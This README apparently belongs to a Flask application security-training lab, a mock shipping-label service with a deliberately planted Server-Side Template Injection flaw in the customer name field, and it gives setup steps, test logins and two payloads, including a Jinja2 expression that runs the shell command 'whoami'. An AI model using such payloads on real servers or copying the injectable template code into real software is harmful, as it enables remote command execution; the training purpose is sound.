# Package Shipper - Security Challenge Application

A Flask web application designed for Application Security training with an intentional Server-Side Template Injection (SSTI) vulnerability.

## Quick Start

### Prerequisites
- Docker installed on your system

### Build and Run

1. **Clone or download this repository**

2. **Build the Docker image:**
   ```bash
   docker build -t package-shipper .
   ```

3. **Run the container:**
   ```bash
   docker run -p 8080:8080 package-shipper
   ```

4. **Access the application:**
   Open your browser to `http://localhost:8080`

### Test Accounts
- **User**: `user@example.com` / `SecurePass123!`
- **Admin**: `admin@example.com` / `AdminSecure456!`

## Challenge Overview

This application simulates a shipping label service where users can create free shipping labels. The application contains **one intentional vulnerability (SSTI)** while maintaining security in all other areas.

### Your Mission
Find and exploit the Server-Side Template Injection vulnerability to achieve command execution on the server.

**Hint**: The vulnerability is in the customer name field during shipping label creation.

### Exploitation Examples

**Test for SSTI:**
```
{{7*7}}
```

**Command Execution:**
```
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

## Application Features

- ✅ User registration and authentication
- ✅ Secure session management (no persistent sessions)
- ✅ CSRF protection on all forms
- ✅ Free shipping label creation
- ✅ SQLite database with secure password hashing
- ❌ **One intentional SSTI vulnerability**

## Alternative Setup (Local Development)

If you prefer to run without Docker:

1. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Initialize database:**
   ```bash
   python init_db.py
   ```

3. **Run application:**
   ```bash
   python app.py
   ```

4. **Access at:** `http://localhost:8080`

## Security Note

This application is designed for educational purposes only. The intentional vulnerability should never be deployed in a production environment.